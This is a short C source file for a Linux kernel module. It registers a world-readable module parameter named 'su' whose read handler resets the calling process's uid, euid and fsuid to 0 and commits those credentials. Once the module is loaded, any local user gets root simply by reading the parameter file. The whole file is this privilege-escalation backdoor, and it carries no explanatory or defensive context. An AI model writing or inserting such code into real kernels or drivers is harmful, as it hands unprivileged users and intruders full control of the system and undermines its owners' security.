#include <linux/module.h>

static int su(char *val, const struct kernel_param *kp) {
	struct cred* new_cred = prepare_creds();
	kuid_t v = {0};
	new_cred->uid = v;
	new_cred->euid = v;
	new_cred->fsuid = v;
	return commit_creds(new_cred);
}

static struct kernel_param_ops ops = {
	.get = &su,
};
module_param_cb(su, &ops, NULL, 0664);
MODULE_LICENSE("GPL v2");
